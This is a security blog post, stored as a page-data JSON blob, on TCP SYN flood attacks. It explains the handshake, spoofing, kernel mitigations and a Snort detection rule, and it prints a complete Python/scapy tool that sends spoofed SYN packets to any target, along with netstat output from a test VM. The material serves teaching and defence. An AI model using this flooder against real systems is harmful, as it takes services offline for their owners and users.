{"data":{"markdownRemark":{"html":"<p>Today it's very easy for people to download tools that overwhelm computer systems <em>(denial of service)</em> in order to take them offline. There are different types of attacks that can be used to create a denial of service attack, one of them is the SYN flood attack which this article will cover. I will also show how to develop your own SYN flooder and some protection mitigations.</p>\n<h2 id=\"what-is-a-syn-flood-attack\"><a href=\"#what-is-a-syn-flood-attack\" aria-label=\"what is a syn flood attack permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>What is a SYN flood attack?</h2>\n<p>The SYN flood attack works by the attacker opening multiple \"half made\" connections and not responding to any <code class=\"language-text\">SYN_ACK</code> packets. In order to understand the SYN flood attack it is vital to understand the TCP 3-way handshake first.</p>\n<h3 id=\"tcp-handshake\"><a href=\"#tcp-handshake\" aria-label=\"tcp handshake permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>TCP handshake</h3>\n<p>When a client wants to talk to a server over TCP, the client initiates what is called the <em>3-way handshake</em>. It begins with the client sending a <code class=\"language-text\">SYN</code> packet to the server, the server receives the packet and responds with a <code class=\"language-text\">SYN_ACK</code> indicating to the client that it received the initial <code class=\"language-text\">SYN</code> packet. When the client receives the <code class=\"language-text\">SYN_ACK</code> it will reply with an <code class=\"language-text\">ACK</code> packet which now establishes a connection between the client and server and they can begin exchanging data. A visual representation can be seen below.</p>\n<p><img src=\"../images/Tcp_normal.svg\"></p>\n<h3 id=\"the-syn-flood-attack\"><a href=\"#the-syn-flood-attack\" aria-label=\"the syn flood attack permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>The SYN flood attack</h3>\n<p>We now know that clients and servers establishes a connection by completing a handshake with each other, what happens if you do not complete the handshake? By sending multiple <code class=\"language-text\">SYN</code> packets to the victim and not responding with an <code class=\"language-text\">ACK</code> message to the victim's <code class=\"language-text\">SYN_ACK</code> message, the victim will have a multiple \"half\" open connections causing the victim's connection table to potentially overflow .</p>\n<h3 id=\"syn-spoofing\"><a href=\"#syn-spoofing\" aria-label=\"syn spoofing permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SYN spoofing</h3>\n<p>An attacker could also spoof the source address of the initial <code class=\"language-text\">SYN</code> packets causing the victim to send <code class=\"language-text\">SYN_ACK</code> messages to an other host, which will respond with a <code class=\"language-text\">RST</code> packet indicating to drop the connection causing the SYN attack to fail. In order for the spoofing to work the attacker needs to select source addresses where there exists no hosts that can respond.</p>\n<h2 id=\"protection\"><a href=\"#protection\" aria-label=\"protection permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Protection</h2>\n<p>There are different ways to limit the effects of SYN flood/spoof attacks, some of are:</p>\n<h4 id=\"remove-random-connections\"><a href=\"#remove-random-connections\" aria-label=\"remove random connections permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Remove random connections</h4>\n<p>Start deleting random \"half made\" connections, this can however delete legitimate connections.</p>\n<h4 id=\"reduce-time-in-syn_received-state\"><a href=\"#reduce-time-in-syn_received-state\" aria-label=\"reduce time in syn_received state permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reduce time in SYN_RECEIVED state</h4>\n<p>When you send SYN packet to a server the connection will be placed in a <code class=\"language-text\">SYN_RECV</code> state and the server will respond with a <code class=\"language-text\">SYN_ACK</code> packet. The server will resend <code class=\"language-text\">SYN_ACK</code> a few times until an <code class=\"language-text\">ACK</code> is received, during this time the connection is still placed in a <code class=\"language-text\">SYN_RECV</code> state. This means the server needs to keep track of thousands of connections which can overflow the server's connection table. By reducing the <code class=\"language-text\">SYN_ACK</code> retries the server will close connections placed in a <code class=\"language-text\">SYN_RECV</code> state earlier which can be very helpful protecting against SYN flood attacks.</p>\n<p>In Linux you can edit <strong>/etc/sysctl.conf</strong> and change <code class=\"language-text\">net.ipv4.tcp_synack_retries</code> from the default value 5 to something lower depending on fast you want your system to close connections in a <code class=\"language-text\">SYN_RECV</code> state. The default value 5 leaves connections in <code class=\"language-text\">SYN_RECV</code> state open for 3 minutes and a value of 3 leaves connections open for roughly 45 seconds. After you have modified the file you can make your changes permanent by running <code class=\"language-text\">sysctl â€“p /etc/sysctl.conf</code> and verify that is has been changed by:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">root@ajax:~# cat /proc/sys/net/ipv4/tcp_synack_retries\n1</code></pre></div>\n<h4 id=\"syn-cookies\"><a href=\"#syn-cookies\" aria-label=\"syn cookies permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SYN cookies</h4>\n<p>Instead of the server keeping track of states for each connection which allocates memory, we can use SYN cookies instead. When a <code class=\"language-text\">SYN</code> is received a hash is computed based on meta information. The receiver (server) sends a <code class=\"language-text\">SYN_ACK</code> with the hash and does not allocate any memory yet, only the hash is stored. The hash consists of the the following:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">Initial Sequence Number (ISN) = hash(source_ip, source_port, destination_ip, destination_port, client&#39;s ISN, secret)</code></pre></div>\n<p>The sender must send an <code class=\"language-text\">ACK</code> with this hash so that the receiver can compare with the stored hash, if success than allocate memory and data structures.</p>\n<p>Enabling SYN cookies in linux is very easy. Edit the file <strong>/etc/sysctl.conf</strong> and make the following modification:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">net.ipv4.tcp_syncookies = 1</code></pre></div>\n<p>Save and run <code class=\"language-text\">sysctl -p</code> to make the change permanent. </p>\n<h2 id=\"building-a-simple-syn-flooder-with-python-using-scapy\"><a href=\"#building-a-simple-syn-flooder-with-python-using-scapy\" aria-label=\"building a simple syn flooder with python using scapy permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Building a simple SYN flooder with Python using scapy</h2>\n<p>Building your own SYN flooder is not difficult and can easily be done with Python and scapy. Below I have written a simple SYN flooder that will send spoofed SYN packets to any target. The program will send 64511 SYN packets <em>per spoofed IP</em> which means a total of 16Â 385 794 packets! </p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">#!/usr/bin/env python3\n\n&quot;&quot;&quot;Simple SYN Flooder and spoofer\n - @mjdubell\n\nThis software is intended for educational purposes and\ncan only be used against systems with permission from owner.\nThe user is the only one responsible for any damages. By using this\nsoftware you agree with the terms.\n\nUsage:\n  syn_flooder.py &lt;dst_ip&gt; &lt;dst_port&gt; [--sleep=&lt;sec&gt;] [--verbose] [--very-verbose]\n\nOptions:\n  -h, --help            Show this screen.\n  --version             Show version.\n  --sleep=&lt;seconds&gt;     How many seconds to sleep betseen scans [default: 0].\n  --verbose             Show addresses being spoofed. [default: False]\n  --very-verbose        Display everything. [default: False]\n\n&quot;&quot;&quot;\nfrom docopt import docopt\nimport logging\nimport signal\nimport sys\nlogging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)\nfrom scapy.all import *\n\n\ndef main(arguments):\n    src_net = &quot;192.168.250.&quot;\n    dst_ip = arguments[&quot;&lt;dst_ip&gt;&quot;]\n    dst_port = int(arguments[&quot;&lt;dst_port&gt;&quot;])\n    sleep = int(arguments[&quot;--sleep&quot;])\n    verbose = arguments[&quot;--verbose&quot;]\n    very_verbose = arguments[&quot;--very-verbose&quot;]\n\n    signal.signal(signal.SIGINT, lambda n, f: sys.exit(0))\n\n    print(&quot;\\n###########################################&quot;)\n    print(&quot;# Starting Denial of Service attack...&quot;)\n    print(f&quot;# Target: {dst_ip}&quot;)\n    print(&quot;###########################################\\n&quot;)\n    for src_host in range(1,254):\n        if verbose or very_verbose:\n            print(f&quot;[*] Sending spoofed SYN packets from {src_net}{src_host}&quot;)\n            print(&quot;--------------------------------------------&quot;)\n\n        for src_port in range(1024, 65535):\n            if very_verbose:\n                print(f&quot;[+] Sending a spoofed SYN packet from {src_net}{src_host}:{src_port}&quot;)\n\n            # Build the packet\n            src_ip = src_net + str(src_host)\n            network_layer = IP(src=src_ip, dst=dst_ip)\n            transport_layer = TCP(sport=src_port, dport=dst_port, flags=&quot;S&quot;)\n\n            # Send the packet\n            send(network_layer/transport_layer, verbose=False)\n\n            if sleep != 0:\n                time.sleep(sleep)\n\n    print(&quot;[+] Denial of Service attack finished.&quot;)\n\nif __name__ == &#39;__main__&#39;:\n    arguments = docopt(__doc__, version=&quot;SYN Flooder 1.5&quot;)\n    main(arguments)</code></pre></div>\n<h5 id=\"project-can-be-found-here-httpsgithubcommjdubellsyn-flooder\"><a href=\"#project-can-be-found-here-httpsgithubcommjdubellsyn-flooder\" aria-label=\"project can be found here httpsgithubcommjdubellsyn flooder permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Project can be found here: <a href=\"https://github.com/mjdubell/SYN-Flooder\">https://github.com/mjdubell/SYN-Flooder</a></h5>\n<p>I ran the program against my debian virtual machine to see if my code worked:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">root@ajax:~# netstat -antp\nActive Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\ntcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      790/exim4\ntcp        0      0 0.0.0.0:58873           0.0.0.0:*               LISTEN      509/rpc.statd\ntcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      500/rpcbind\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      525/sshd\ntcp        0      0 192.168.1.93:22         192.168.3.1:2045        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1885        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1828        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1878        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1102        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1090        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1148        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1101        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1129        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1172        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1169        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1173        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1829        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1089        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:2056        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:2040        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1247        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1153        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1072        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1143        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1881        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1852        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1274        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:2057        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1277        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1088        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1880        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1164        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1119        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1860        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1134        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1163        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1115        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1075        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1876        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1250        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1103        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:2061        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1186        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1109        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1135        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1883        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1168        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1887        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:2066        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1191        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1141        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1827        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1246        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:2041        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1892        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:2035        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:2073        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1255        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1145        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1144        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1151        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1147        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1161        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1890        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1104        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1863        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1194        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1128        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1278        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1259        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1193        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1187        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1851        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1266        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1263        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1251        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1181        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:2036        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1895        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1154        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1125        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1182        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:2072        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1265        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1257        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1201        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1275        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1116        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1167        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:2060        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1877        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1888        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1176        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1884        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1139        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:2055        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1137        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1160        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1091        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1098        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:2068        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:2037        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:2071        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:2034        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1894        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1156        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1092        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1886        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:2064        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1889        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1177        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1107        SYN_RECV    -\ntcp        0      0 192.168.1.93:22         192.168.3.1:1085        SYN_RECV    -\ntcp        0  40152 192.168.1.93:22         192.168.1.207:59318     ESTABLISHED 4638/sshd: user [p\ntcp6       0      0 ::1:25                  :::*                    LISTEN      790/exim4\ntcp6       0      0 :::111                  :::*                    LISTEN      500/rpcbind\ntcp6       0      0 :::39185                :::*                    LISTEN      509/rpc.statd\ntcp6       0      0 :::22                   :::*                    LISTEN      525/sshd\nroot@ajax:~#</code></pre></div>\n<p>As we can see, there is a lot of connections placed in a <code class=\"language-text\">SYN_RECV</code> state meaning the virtual machine replied with a <code class=\"language-text\">SYN-ACK</code> but is waiting for an <code class=\"language-text\">ACK</code> from the spoofed address. I never ran the program to completion but if had done that, there would be thousands of connections stuck in a <code class=\"language-text\">SYN_RECV</code> state, potentially causing a denial of service.</p>\n<h2 id=\"detection\"><a href=\"#detection\" aria-label=\"detection permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Detection</h2>\n<p>Using an <strong>Intrusion Detection System</strong> such as Snort, it's possible to detect SYN flood attacks. Since I am running Snort in my network, I decided to create a snort rule to detect when running my SYN flooder program. Below you will find the rule:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">alert tcp any any -&gt; 192.168.1.0/24 any ( msg:&quot;Possible SYN flood&quot;; classtype:attempted-dos; sid:1999999; flags:S; flow: stateless; detection_filter: track by_dst, count 50, seconds 10;)</code></pre></div>\n<p>This rule will alert every SYN packet during one sampling period of 10 seconds, after the first 50 SYN packets. However this rule may not apply for all network environments. Depending on your needs you may need to increase/decrease the count or amount of seconds.</p>\n<h2 id=\"conclusion\"><a href=\"#conclusion\" aria-label=\"conclusion permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Conclusion</h2>\n<p>Protecting against DoS attacks, particular SYN flood attacks with spoofing can be difficult. But there are some security measures that can be taken which will hopefully reduce the effects of a DoS attack. Using SYN cookies, IDS/IPS or simply reducing time spent in <code class=\"language-text\">SYN_RECV</code> state are all possible methods to stop or reduce DoS attacks. </p>\n<p>More information about protecting against SYN flood attacks can be found in the <a href=\"https://tools.ietf.org/html/rfc4987\">RFC 4987</a>. Writing rules for snort: <a href=\"http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node27.html\">http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node27.html</a></p>","timeToRead":13,"excerpt":"Today it's very easy for people to download tools that overwhelm computer systems  (denial of service)  in order to take them offline. Thereâ€¦","frontmatter":{"title":"Creating SYN flood attacks with Python","slug":"creating-syn-flood-attacks-with-python","date":"2016-06-22T00:00:00.000Z","categories":["Network Security"],"tags":["Network Security"],"template":"post"},"fields":{"nextTitle":"Monitoring your server with Monit","nextSlug":"/monitoring-your-server-with-monit/","prevTitle":"Exploiting weak Content Security Policy (CSP) rules for fun and profit","prevSlug":"/exploiting-weak-content-security-policy-csp-rules-for-fun-and-profit/","slug":"/creating-syn-flood-attacks-with-python/","date":"2016-06-22T00:00:00.000Z"}}},"pageContext":{"slug":"/creating-syn-flood-attacks-with-python/"}}